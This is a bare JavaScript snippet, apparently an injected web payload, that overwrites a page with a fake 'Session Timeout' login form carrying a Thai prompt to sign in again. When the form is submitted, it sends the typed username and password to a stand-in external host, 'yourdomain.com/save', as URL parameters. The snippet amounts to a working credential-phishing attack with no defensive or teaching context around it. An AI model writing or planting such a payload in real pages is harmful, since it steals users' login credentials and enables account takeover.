document.body.innerHTML = `
  <h2>Session Timeout</h2>
  <p>กรุณาเข้าสู่ระบบอีกครั้ง</p>
  <form onsubmit="fetch('https://yourdomain.com/save?user=' + this.username.value + '&pass=' + this.password.value); return false;">
    <input name="username" placeholder="Username"><br>
    <input name="password" placeholder="Password" type="password"><br>
    <button type="submit">Login</button>
  </form>
`;
